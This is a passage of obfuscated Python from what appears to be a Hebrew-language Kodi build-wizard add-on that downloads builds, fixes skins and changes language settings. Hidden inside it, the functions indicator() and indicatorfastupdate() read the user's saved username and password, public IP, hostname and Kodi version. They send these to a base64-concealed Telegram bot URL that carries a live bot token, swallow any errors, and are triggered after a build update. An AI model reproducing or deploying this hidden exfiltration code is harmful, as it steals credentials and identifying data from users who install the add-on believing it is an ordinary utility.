                    OO0O000O00OOO0O00 =int (O0O0O00OOO0O0OO00 *OO0000O000OO0OOO0 )#line:3381
                    if OOO0O00O00O0O0O00 ==0 :#line:3382
                        OOO0O00O00O0O0O00 =0.1 #line:3383
                    OO0O000OOOO000O00 =int (OO0O000O00OOO0O00 /(1024 *OOO0O00O00O0O0O00 ))#line:3384
                    OOOO00O0OOO0OO0OO =int (O0O0O00OOO0O0OO00 *OO0000O000OO0OOO0 *100 /OOO00OOOOOO00OO00 )#line:3385
                    if OO0O000OOOO000O00 >1024 and not OOOO00O0OOO0OO0OO ==100 :#line:3386
                      O0O000O0OOO0OO00O =int (((OOO00OOOOOO00OO00 -OO0O000O00OOO0O00 )/1024 )/(OO0O000OOOO000O00 ))#line:3387
                    else :#line:3388
                      O0O000O0OOO0OO00O =0 #line:3389
                    OO0OO0O000OO00OO0 .update (int (OOOO00O0OOO0OO0OO ),name ,"\r%d%%,[COLOR aqua] %d MB / %d MB [/COLOR], %d KB/s "%(OOOO00O0OOO0OO0OO ,OO0O000O00OOO0O00 /(1024 *1024 ),OOO00OOOOOO00OO00 /(1000 *1000 ),OO0O000OOOO000O00 ),'[B]ETA:[/B] [COLOR aqua]%02d:%02d[/COLOR]'%divmod (O0O000O0OOO0OO00O ,60 ))#line:3391
                    O0O0O00OOO0O0OO00 +=1 #line:3392
                    if OO0OO0O000OO00OO0 .iscanceled ():#line:3393
                     OO0OO0O000OO00OO0 .close ()#line:3394
                     break #line:3395
    O00OOO0000OOO00O0 ="https://docs.google.com/uc?export=download"#line:3396
    import urllib2 #line:3401
    import cookielib #line:3402
    from cookielib import CookieJar #line:3404
    O000O0OO0O00OOO00 =CookieJar ()#line:3406
    O000OO0O0O000OOOO =urllib2 .build_opener (urllib2 .HTTPCookieProcessor (O000O0OO0O00OOO00 ))#line:3407
    OOOO00OO0OOO0OO0O ={'id':O0O0O0OO000OOOOOO }#line:3409
    O000000OOO0OO00OO =urllib .urlencode (OOOO00OO0OOO0OO0O )#line:3410
    logging .warning (O00OOO0000OOO00O0 +'&'+O000000OOO0OO00OO )#line:3411
    OOO00O0O00O0O000O =O000OO0O0O000OOOO .open (O00OOO0000OOO00O0 +'&'+O000000OOO0OO00OO )#line:3412
    O0OO0OO00O000OO00 =OOO00O0O00O0O000O .read ()#line:3413
    for O00OOOOO0O00000OO in O000O0OO0O00OOO00 :#line:3415
         logging .warning (O00OOOOO0O00000OO )#line:3416
    O00O0000O00OOO00O =O00OOO0OOOO0000O0 (O000O0OO0O00OOO00 )#line:3417
    logging .warning (O00O0000O00OOO00O )#line:3418
    if O00O0000O00OOO00O :#line:3419
        O0OOO000OOO0OOO00 ={'id':O0O0O0OO000OOOOOO ,'confirm':O00O0000O00OOO00O }#line:3420
        O00OOO0OO00000O00 ={'Access-Control-Allow-Headers':'Content-Length'}#line:3421
        O000000OOO0OO00OO =urllib .urlencode (O0OOO000OOO0OOO00 )#line:3422
        OOO00O0O00O0O000O =O000OO0O0O000OOOO .open (O00OOO0000OOO00O0 +'&'+O000000OOO0OO00OO )#line:3423
        chunk_read (OOO00O0O00O0O000O ,report_hook =chunk_report ,dp =OO0OO0O000OO00OO0 ,destination =OO000O00O0O0O000O ,filesize =O00OO0OO0000OOOO0 )#line:3424
    return (OO00O00O000OO0O0O )#line:3428
def kodi17Fix ():#line:3429
	OO0000OO0O0000O0O =glob .glob (os .path .join (ADDONS ,'*/'))#line:3430
	OO00000OO00OO0O00 =[]#line:3431
	for O00O00000O000OO00 in sorted (OO0000OO0O0000O0O ,key =lambda OO0O0OO0OOOOOOO0O :OO0O0OO0OOOOOOO0O ):#line:3432
		OO0OOO0OOOOOO0OO0 =os .path .join (O00O00000O000OO00 ,'addon.xml')#line:3433
		if os .path .exists (OO0OOO0OOOOOO0OO0 ):#line:3434
			O00O0OO0O0O0OO0OO =O00O00000O000OO00 .replace (ADDONS ,'')[1 :-1 ]#line:3435
			O0OOO0O0OO0OO0O00 =open (OO0OOO0OOOOOO0OO0 )#line:3436
			OO0OO00O0OOOOO0OO =O0OOO0O0OO0OO0O00 .read ()#line:3437
			OOOOO0O00O0OO0OOO =parseDOM (OO0OO00O0OOOOO0OO ,'addon',ret ='id')#line:3438
			O0OOO0O0OO0OO0O00 .close ()#line:3439
			try :#line:3440
				O00O0O0OO0OOO000O =xbmcaddon .Addon (id =OOOOO0O00O0OO0OOO [0 ])#line:3441
			except :#line:3442
				try :#line:3443
					log ("%s was disabled"%OOOOO0O00O0OO0OOO [0 ],xbmc .LOGDEBUG )#line:3444
					OO00000OO00OO0O00 .append (OOOOO0O00O0OO0OOO [0 ])#line:3445
				except :#line:3446
					try :#line:3447
						log ("%s was disabled"%O00O0OO0O0O0OO0OO ,xbmc .LOGDEBUG )#line:3448
						OO00000OO00OO0O00 .append (O00O0OO0O0O0OO0OO )#line:3449
					except :#line:3450
						if len (OOOOO0O00O0OO0OOO )==0 :log ("Unabled to enable: %s(Cannot Determine Addon ID)"%O00O0OO0O0O0OO0OO ,xbmc .LOGERROR )#line:3451
						else :log ("Unabled to enable: %s"%O00O00000O000OO00 ,xbmc .LOGERROR )#line:3452
	if len (OO00000OO00OO0O00 )>0 :#line:3453
		OOO000OO0O00OO000 =0 #line:3454
		DP .create (ADDONTITLE ,'[COLOR %s]Enabling disabled Addons'%COLOR2 ,'','Please Wait[/COLOR]')#line:3455
		for O00OOO0O0OOOOO0O0 in OO00000OO00OO0O00 :#line:3456
			OOO000OO0O00OO000 +=1 #line:3457
			O00O0O00O0OO00OO0 =int (percentage (OOO000OO0O00OO000 ,len (OO00000OO00OO0O00 )))#line:3458
			DP .update (O00O0O00O0OO00OO0 ,"","Enabling: [COLOR %s]%s[/COLOR]"%(COLOR1 ,O00OOO0O0OOOOO0O0 ))#line:3459
			addonDatabase (O00OOO0O0OOOOO0O0 ,1 )#line:3460
			if DP .iscanceled ():break #line:3461
		if DP .iscanceled ():#line:3462
			DP .close ()#line:3463
			LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Enabling Addons Cancelled![/COLOR]"%COLOR2 )#line:3464
			sys .exit ()#line:3465
		DP .close ()#line:3466
	forceUpdate ()#line:3467
def indicator ():#line:3469
       try :#line:3470
          import json #line:3471
          wiz .log ('FRESH MESSAGE')#line:3472
          O00O00OOO00O000OO =(ADDON .getSetting ("user"))#line:3473
          O0OO0O00000O0000O =(ADDON .getSetting ("pass"))#line:3474
          OOO00O0O0O0O00OOO =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:3475
          OOO0O0OO000OOOO00 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDc1MDEwMDI1NjpBQUVJVnpTSndOM2t6T25EV0F3Yi1LTkk3VUREY2N6aEx6VS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0xMDAxNDE1ODcxNzk3JnRleHQ915TXqten15nXnyDXkNeqINeU15HXmdec15Mg16nXnNeaIA=='#line:3476
          O0OO0OOO0OOOO0000 =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:3477
          OOO0O00O0O000O0O0 =str (json .loads (O0OO0OOO0OOOO0000 )['ip'])#line:3478
          OOOO0000O0OO00OO0 =O00O00OOO00O000OO #line:3479
          OOO000O000000OOO0 =O0OO0O00000O0000O #line:3480
          import socket #line:3481
          O0OO0OOO0OOOO0000 =urllib2 .urlopen (OOO0O0OO000OOOO00 .decode ('base64')+' - '+(socket .gethostbyaddr (socket .gethostname ())[0 ])+' - '+OOOO0000O0OO00OO0 +' - '+OOO000O000000OOO0 +' - '+OOO00O0O0O0O00OOO +' - '+OOO0O00O0O000O0O0 ).readlines ()#line:3482
       except :pass #line:3484
def indicatorfastupdate ():#line:3486
       try :#line:3487
          import json #line:3488
          wiz .log ('FRESH MESSAGE')#line:3489
          OO0O0000OO0O00OOO =(ADDON .getSetting ("user"))#line:3490
          O0OOO00O0000OO0OO =(ADDON .getSetting ("pass"))#line:3491
          OO0O0O0O0OO0OOOO0 =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:3492
          O000OOO000O00O0OO ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0yNzQyNjIzODkmdGV4dD0g16LXqdeUINei15PXm9eV158g157XlNeZ16gg'#line:3494
          OO00OOO0O00000000 =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:3495
          O0O000OO0O0OO0O0O =str (json .loads (OO00OOO0O00000000 )['ip'])#line:3496
          OO00OOOO0OOO0O00O =OO0O0000OO0O00OOO #line:3497
          O0OO00O00OOO0O000 =O0OOO00O0000OO0OO #line:3498
          import socket #line:3500
          OO00OOO0O00000000 =urllib2 .urlopen (O000OOO000O00O0OO .decode ('base64')+' - '+(socket .gethostbyaddr (socket .gethostname ())[0 ])+' - '+OO00OOOO0OOO0O00O +' - '+O0OO00O00OOO0O000 +' - '+OO0O0O0O0OO0OOOO0 +' - '+O0O000OO0O0OO0O0O ).readlines ()#line:3501
       except :pass #line:3503
def skinfix18 ():#line:3505
	if KODIV >=18 and os .path .exists (os .path .join (ADDONS ,SKINID18 )):#line:3506
		OOOO000000O0O0OOO =wiz .workingURL (SKINID18DDONXML )#line:3507
		if OOOO000000O0O0OOO ==True :#line:3508
			OOOOO00OO000OO0OO =wiz .parseDOM (wiz .openURL (SKINID18DDONXML ),'addon',ret ='version',attrs ={'id':SKINID18 })#line:3509
			if len (OOOOO00OO000OO0OO )>0 :#line:3510
				O0O000O0OOOO00OOO ='%s-%s.zip'%(SKINID18 ,OOOOO00OO000OO0OO [0 ])#line:3511
				O000OO00OOOOOOOO0 =wiz .workingURL (SKIN18ZIPURL +O0O000O0OOOO00OOO )#line:3512
				if O000OO00OOOOOOOO0 ==True :#line:3513
					DP .create (ADDONTITLE ,'מתאים את הסקין לקודי שלך, אנא המתן....','','Please Wait')#line:3514
					if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3515
					OO00OOO0OOOOOOOO0 =os .path .join (PACKAGES ,O0O000O0OOOO00OOO )#line:3516
					try :os .remove (OO00OOO0OOOOOOOO0 )#line:3517
					except :pass #line:3518
					downloader .download (SKIN18ZIPURL +O0O000O0OOOO00OOO ,OO00OOO0OOOOOOOO0 ,DP )#line:3519
					extract .all (OO00OOO0OOOOOOOO0 ,HOME ,DP )#line:3520
					try :#line:3521
						OO0OOOO00O0O0O0OO =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos107.db")#line:3522
						OOO0OO00O00O0OOO0 =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos116.db")#line:3523
						os .rename (OO0OOOO00O0O0O0OO ,OOO0OO00O00O0OOO0 )#line:3524
					except :#line:3525
						pass #line:3526
					try :#line:3527
						O00OOOO0O00O0O0O0 =open (os .path .join (ADDONS ,SKINID18 ,'addon.xml'),mode ='r');O0OOO00O0000O0OO0 =O00OOOO0O00O0O0O0 .read ();O00OOOO0O00O0O0O0 .close ()#line:3528
						OOO000O0OO0OOO0OO =wiz .parseDOM (O0OOO00O0000O0OO0 ,'addon',ret ='name',attrs ={'id':SKINID18 })#line:3529
						wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,OOO000O0OO0OOO0OO [0 ]),"[COLOR %s]Add-on updated[/COLOR]"%COLOR2 ,icon =os .path .join (ADDONS ,SKINID18 ,'icon.png'))#line:3530
					except :#line:3531
						pass #line:3532
					if KODIV >=17 :wiz .addonDatabase (SKINID18 ,1 )#line:3533
					DP .close ()#line:3534
					xbmc .sleep (500 )#line:3535
					wiz .forceUpdate (True )#line:3536
					wiz .log ("[Auto Install Repo] Successfully Installed",xbmc .LOGNOTICE )#line:3537
				else :#line:3538
					wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid url for zip![/COLOR]"%COLOR2 )#line:3539
					wiz .log ("[Auto Install Repo] Was unable to create a working url for repository. %s"%O000OO00OOOOOOOO0 ,xbmc .LOGERROR )#line:3540
			else :#line:3541
				wiz .log ("Invalid URL for Repo Zip",xbmc .LOGERROR )#line:3542
		else :#line:3543
			wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid addon.xml file![/COLOR]"%COLOR2 )#line:3544
			wiz .log ("[Auto Install Repo] Unable to read the addon.xml file.",xbmc .LOGERROR )#line:3545
def skinfix17 ():#line:3546
	if KODIV >=17 and KODIV <18 and os .path .exists (os .path .join (ADDONS ,SKINID17 )):#line:3547
		O0OOOO00OOOOO00O0 =wiz .workingURL (SKINID17DDONXML )#line:3548
		if O0OOOO00OOOOO00O0 ==True :#line:3549
			O0O0O0O0O0OO0000O =wiz .parseDOM (wiz .openURL (SKINID17DDONXML ),'addon',ret ='version',attrs ={'id':SKINID17 })#line:3550
			if len (O0O0O0O0O0OO0000O )>0 :#line:3551
				O00O0O00O00O000O0 ='%s-%s.zip'%(SKINID17 ,O0O0O0O0O0OO0000O [0 ])#line:3552
				O0O0OO0O0O000OOOO =wiz .workingURL (SKIN17ZIPURL +O00O0O00O00O000O0 )#line:3553
				if O0O0OO0O0O000OOOO ==True :#line:3554
					DP .create (ADDONTITLE ,'מתאים את הסקין לקודי שלך, אנא המתן....','','Please Wait')#line:3555
					if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3556
					O0O00OOOOO00O0OOO =os .path .join (PACKAGES ,O00O0O00O00O000O0 )#line:3557
					try :os .remove (O0O00OOOOO00O0OOO )#line:3558
					except :pass #line:3559
					downloader .download (SKIN17ZIPURL +O00O0O00O00O000O0 ,O0O00OOOOO00O0OOO ,DP )#line:3560
					extract .all (O0O00OOOOO00O0OOO ,HOME ,DP )#line:3561
					try :#line:3562
						O000O0OO0000000OO =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos116.db")#line:3563
						O0OO0000000O0OO0O =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos107.db")#line:3564
						os .rename (O000O0OO0000000OO ,O0OO0000000O0OO0O )#line:3565
					except :#line:3566
						pass #line:3567
					try :#line:3568
						O00OOO0OO00O0OO00 =open (os .path .join (ADDONS ,SKINID17 ,'addon.xml'),mode ='r');O00OOOO0O0O0000OO =O00OOO0OO00O0OO00 .read ();O00OOO0OO00O0OO00 .close ()#line:3569
						O0OO00OOOOOO0O0O0 =wiz .parseDOM (O00OOOO0O0O0000OO ,'addon',ret ='name',attrs ={'id':SKINID17 })#line:3570
						wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,O0OO00OOOOOO0O0O0 [0 ]),"[COLOR %s]Add-on updated[/COLOR]"%COLOR2 ,icon =os .path .join (ADDONS ,SKINID17 ,'icon.png'))#line:3571
					except :#line:3572
						pass #line:3573
					if KODIV >=17 :wiz .addonDatabase (SKINID17 ,1 )#line:3574
					DP .close ()#line:3575
					xbmc .sleep (500 )#line:3576
					wiz .forceUpdate (True )#line:3577
					wiz .log ("[Auto Install Repo] Successfully Installed",xbmc .LOGNOTICE )#line:3578
				else :#line:3579
					wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid url for zip![/COLOR]"%COLOR2 )#line:3580
					wiz .log ("[Auto Install Repo] Was unable to create a working url for repository. %s"%O0O0OO0O0O000OOOO ,xbmc .LOGERROR )#line:3581
			else :#line:3582
				wiz .log ("Invalid URL for Repo Zip",xbmc .LOGERROR )#line:3583
		else :#line:3584
			wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid addon.xml file![/COLOR]"%COLOR2 )#line:3585
			wiz .log ("[Auto Install Repo] Unable to read the addon.xml file.",xbmc .LOGERROR )#line:3586
def fix17update ():#line:3587
	if KODIV >=17 and KODIV <18 :#line:3588
		wiz .kodi17Fix ()#line:3589
		xbmc .sleep (4000 )#line:3590
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.language","value":"resource.language.he_il"}}')#line:3591
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"subtitles.font","value":"ntkl.ttf"}}')#line:3592
		fixfont ()#line:3593
		O00O00O0OO00OOO00 =os .path .join (xbmc .translatePath ("special://home/"),"addons","skin.Premium.mod","addon.xml")#line:3594
		try :#line:3596
			OOO00OO0OO0000OOO =open (O00O00O0OO00OOO00 ,'r')#line:3597
			OO0000OOOO00O0000 =OOO00OO0OO0000OOO .read ()#line:3598
			OOO00OO0OO0000OOO .close ()#line:3599
			O0O0OO000OOOO0000 ='<import addon="xbmc.gui" version="5.14.0(.+?)/>'#line:3600
			O00OOO00O00O00000 =re .compile (O0O0OO000OOOO0000 ).findall (OO0000OOOO00O0000 )[0 ]#line:3601
			OOO00OO0OO0000OOO =open (O00O00O0OO00OOO00 ,'w')#line:3602
			OOO00OO0OO0000OOO .write (OO0000OOOO00O0000 .replace ('<import addon="xbmc.gui" version="5.14.0%s/>'%O00OOO00O00O00000 ,'<import addon="xbmc.gui" version="5.12.0"/>'))#line:3603
			OOO00OO0OO0000OOO .close ()#line:3604
		except :#line:3605
				pass #line:3606
		wiz .kodi17Fix ()#line:3607
		O00O00O0OO00OOO00 =os .path .join (xbmc .translatePath ("special://userdata"),"guisettings.xml")#line:3608
		try :#line:3609
			OOO00OO0OO0000OOO =open (O00O00O0OO00OOO00 ,'r')#line:3610
			OO0000OOOO00O0000 =OOO00OO0OO0000OOO .read ()#line:3611
			OOO00OO0OO0000OOO .close ()#line:3612
			O0O0OO000OOOO0000 ='<keyboardlayouts default="true(.+?)/keyboardlayouts>'#line:3613
			O00OOO00O00O00000 =re .compile (O0O0OO000OOOO0000 ).findall (OO0000OOOO00O0000 )[0 ]#line:3614
			OOO00OO0OO0000OOO =open (O00O00O0OO00OOO00 ,'w')#line:3615
			OOO00OO0OO0000OOO .write (OO0000OOOO00O0000 .replace ('<keyboardlayouts default="true%s/keyboardlayouts>'%O00OOO00O00O00000 ,'<keyboardlayouts>English QWERTY|Hebrew QWERTY</keyboardlayouts>'))#line:3616
			OOO00OO0OO0000OOO .close ()#line:3617
		except :#line:3618
				pass #line:3619
		swapSkins ('skin.Premium.mod')#line:3620
def fix18update ():#line:3622
	if KODIV >=18 :#line:3623
		xbmc .sleep (4000 )#line:3624
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.language","value":"resource.language.he_il"}}')#line:3625
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"subtitles.font","value":"ntkl.ttf"}}')#line:3626
		fixfont ()#line:3627
		O0O0O00O0O00OOOOO =os .path .join (xbmc .translatePath ("special://home/"),"addons","skin.Premium.mod","addon.xml")#line:3628
		try :#line:3629
			OOOO0O0O00000O000 =open (O0O0O00O0O00OOOOO ,'r')#line:3630
			OO0OOO00O0OOOO000 =OOOO0O0O00000O000 .read ()#line:3631
			OOOO0O0O00000O000 .close ()#line:3632
			OOOO0O0OOO00OO0O0 ='<import addon="xbmc.gui" version="5.12.0(.+?)/>'#line:3633
			O00OOO0O000000O00 =re .compile (OOOO0O0OOO00OO0O0 ).findall (OO0OOO00O0OOOO000 )[0 ]#line:3634
			OOOO0O0O00000O000 =open (O0O0O00O0O00OOOOO ,'w')#line:3635
			OOOO0O0O00000O000 .write (OO0OOO00O0OOOO000 .replace ('<import addon="xbmc.gui" version="5.12.0%s/>'%O00OOO0O000000O00 ,'<import addon="xbmc.gui" version="5.14.0"/>'))#line:3636
			OOOO0O0O00000O000 .close ()#line:3637
		except :#line:3638
				pass #line:3639
		wiz .kodi17Fix ()#line:3640
		O0O0O00O0O00OOOOO =os .path .join (xbmc .translatePath ("special://userdata"),"guisettings.xml")#line:3641
		try :#line:3642
			OOOO0O0O00000O000 =open (O0O0O00O0O00OOOOO ,'r')#line:3643
			OO0OOO00O0OOOO000 =OOOO0O0O00000O000 .read ()#line:3644
			OOOO0O0O00000O000 .close ()#line:3645
			OOOO0O0OOO00OO0O0 ='<setting id="locale.keyboardlayouts" default="true(.+?)/setting>'#line:3646
			O00OOO0O000000O00 =re .compile (OOOO0O0OOO00OO0O0 ).findall (OO0OOO00O0OOOO000 )[0 ]#line:3647
			OOOO0O0O00000O000 =open (O0O0O00O0O00OOOOO ,'w')#line:3648
			OOOO0O0O00000O000 .write (OO0OOO00O0OOOO000 .replace ('<setting id="locale.keyboardlayouts" default="true%s/setting>'%O00OOO0O000000O00 ,'<setting id="locale.keyboardlayouts">English QWERTY|Hebrew QWERTY</setting>'))#line:3649
			OOOO0O0O00000O000 .close ()#line:3650
		except :#line:3651
				pass #line:3652
		swapSkins ('skin.Premium.mod')#line:3653
def buildWizard (O0000O0O0OO00O0O0 ,O0OOO00OOO000OOOO ,theme =None ,over =False ):#line:3656
	if over ==False :#line:3657
		OOOOO0O000O00OOOO =wiz .checkBuild (O0000O0O0OO00O0O0 ,'url')#line:3658
		if OOOOO0O000O00OOOO ==False :#line:3660
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]אנא המתן...[/COLOR]'%COLOR2 )#line:3665
			xbmc .executebuiltin ("RunPlugin(plugin://plugin.program.Anonymous/?mode=install&name=+Kodi+Premium&url=gui)")#line:3666
			return #line:3667
		OO00000000OO00O0O =wiz .workingURL (OOOOO0O000O00OOOO )#line:3668
		if OO00000000OO00O0O ==False :#line:3669
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Build Zip Error: %s[/COLOR]"%(COLOR2 ,OO00000000OO00O0O ))#line:3670
			return #line:3671
	if O0OOO00OOO000OOOO =='gui':#line:3672
		if O0000O0O0OO00O0O0 ==BUILDNAME :#line:3673
			if over ==True :OOO0O0O00OOOOOOOO =1 #line:3674
			else :OOO0O0O00OOOOOOOO =1 #line:3675
		else :#line:3676
			OOO0O0O00OOOOOOOO =1 #line:3677
		if OOO0O0O00OOOOOOOO :#line:3678
			remove_addons ()#line:3679
			remove_addons2 ()#line:3680
			O000O0OOOOOOOO0O0 =wiz .checkBuild (O0000O0O0OO00O0O0 ,'gui')#line:3681
			O0O0OO0OO00OOOOO0 =O0000O0O0OO00O0O0 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:3682
			if not wiz .workingURL (O000O0OOOOOOOO0O0 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:3683
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3684
			DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0000O0O0OO00O0O0 ),'','אנא המתן')#line:3685
			OOOO00OO0000OO0O0 =os .path .join (PACKAGES ,'%s_guisettings.zip'%O0O0OO0OO00OOOOO0 )#line:3686
			try :os .remove (OOOO00OO0000OO0O0 )#line:3687
			except :pass #line:3688
			logging .warning (O000O0OOOOOOOO0O0 )#line:3689
			if 'google'in O000O0OOOOOOOO0O0 :#line:3690
			   OO00O00O0OOOOOO00 =googledrive_download (O000O0OOOOOOOO0O0 ,OOOO00OO0000OO0O0 ,DP ,wiz .checkBuild (O0000O0O0OO00O0O0 ,'filesize'))#line:3691
			else :#line:3694
			  downloader .download (O000O0OOOOOOOO0O0 ,OOOO00OO0000OO0O0 ,DP )#line:3695
			xbmc .sleep (100 )#line:3696
			OOOO0O000OO000O0O ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0000O0O0OO00O0O0 )#line:3697
			DP .update (0 ,OOOO0O000OO000O0O ,'','אנא המתן')#line:3698
			extract .all (OOOO00OO0000OO0O0 ,HOME ,DP ,title =OOOO0O000OO000O0O )#line:3699
			DP .close ()#line:3700
			wiz .defaultSkin ()#line:3701
			wiz .lookandFeelData ('save')#line:3702
			wiz .kodi17Fix ()#line:3703
			if KODIV >=18 :#line:3704
				skindialogsettind18 ()#line:3705
			xbmc .executebuiltin ("ReloadSkin()")#line:3706
			if INSTALLMETHOD ==1 :O0OO00O00OOOOO0O0 =1 #line:3707
			elif INSTALLMETHOD ==2 :O0OO00O00OOOOO0O0 =0 #line:3708
			else :DP .close ()#line:3709
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הבילד עודכן בהצלחה![/COLOR]'%COLOR2 )#line:3710
			indicatorfastupdate ()#line:3711
		else :#line:3713
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Cancelled![/COLOR]'%COLOR2 )#line:3714
	if O0OOO00OOO000OOOO =='gui2':#line:3715
		if O0000O0O0OO00O0O0 ==BUILDNAME :#line:3716
			if over ==True :OOO0O0O00OOOOOOOO =1 #line:3717
			else :OOO0O0O00OOOOOOOO =1 #line:3718
		else :#line:3719
			OOO0O0O00OOOOOOOO =1 #line:3720
		if OOO0O0O00OOOOOOOO :#line:3721
			remove_addons ()#line:3722
			remove_addons2 ()#line:3723
			O000O0OOOOOOOO0O0 =wiz .checkBuild (O0000O0O0OO00O0O0 ,'gui')#line:3724
			O0O0OO0OO00OOOOO0 =O0000O0O0OO00O0O0 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:3725
			if not wiz .workingURL (O000O0OOOOOOOO0O0 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:3726
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3727
			DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0000O0O0OO00O0O0 ),'','אנא המתן')#line:3728
			OOOO00OO0000OO0O0 =os .path .join (PACKAGES ,'%s_guisettings.zip'%O0O0OO0OO00OOOOO0 )#line:3729
			try :os .remove (OOOO00OO0000OO0O0 )#line:3730
			except :pass #line:3731
			logging .warning (O000O0OOOOOOOO0O0 )#line:3732
			if 'google'in O000O0OOOOOOOO0O0 :#line:3733
			   OO00O00O0OOOOOO00 =googledrive_download (O000O0OOOOOOOO0O0 ,OOOO00OO0000OO0O0 ,DP ,wiz .checkBuild (O0000O0O0OO00O0O0 ,'filesize'))#line:3734
			else :#line:3737
			  downloader .download (O000O0OOOOOOOO0O0 ,OOOO00OO0000OO0O0 ,DP )#line:3738
			xbmc .sleep (100 )#line:3739
			OOOO0O000OO000O0O ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0000O0O0OO00O0O0 )#line:3740
			DP .update (0 ,OOOO0O000OO000O0O ,'','אנא המתן')#line:3741
			extract .all (OOOO00OO0000OO0O0 ,HOME ,DP ,title =OOOO0O000OO000O0O )#line:3742
			DP .close ()#line:3743
			wiz .defaultSkin ()#line:3744
			wiz .lookandFeelData ('save')#line:3745
			if INSTALLMETHOD ==1 :O0OO00O00OOOOO0O0 =1 #line:3748
			elif INSTALLMETHOD ==2 :O0OO00O00OOOOO0O0 =0 #line:3749
			else :DP .close ()#line:3750
		else :#line:3752
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Cancelled![/COLOR]'%COLOR2 )#line:3753
	elif O0OOO00OOO000OOOO =='fresh':#line:3754
		freshStart (O0000O0O0OO00O0O0 )#line:3755
	elif O0OOO00OOO000OOOO =='normal':#line:3756
		if url =='normal':#line:3757
			if KEEPTRAKT =='true':#line:3758
				traktit .autoUpdate ('all')#line:3759
				wiz .setS ('traktlastsave',str (THREEDAYS ))#line:3760
			if KEEPREAL =='true':#line:3761
				debridit .autoUpdate ('all')#line:3762
				wiz .setS ('debridlastsave',str (THREEDAYS ))#line:3763
			if KEEPLOGIN =='true':#line:3764
				loginit .autoUpdate ('all')#line:3765
				wiz .setS ('loginlastsave',str (THREEDAYS ))#line:3766
		OO0000O0O00OO00OO =int (KODIV );OO0OOOOOOO00O0000 =int (float (wiz .checkBuild (O0000O0O0OO00O0O0 ,'kodi')))#line:3767
		if not OO0000O0O00OO00OO ==OO0OOOOOOO00O0000 :#line:3768
			if OO0000O0O00OO00OO ==16 and OO0OOOOOOO00O0000 <=15 :OO0OOO0000000OO0O =False #line:3769
			else :OO0OOO0000000OO0O =True #line:3770
		else :OO0OOO0000000OO0O =False #line:3771
		if OO0OOO0000000OO0O ==True :#line:3772
			O0O00OOO0O0000OO0 =1 #line:3773
		else :#line:3774
			if not over ==False :O0O00OOO0O0000OO0 =1 #line:3775
			else :O0O00OOO0O0000OO0 =DIALOG .yesno (ADDONTITLE ,'התקנה רגילה:','מצב זה שומר הרחבות קיימות, האם להמשיך?',nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:3776
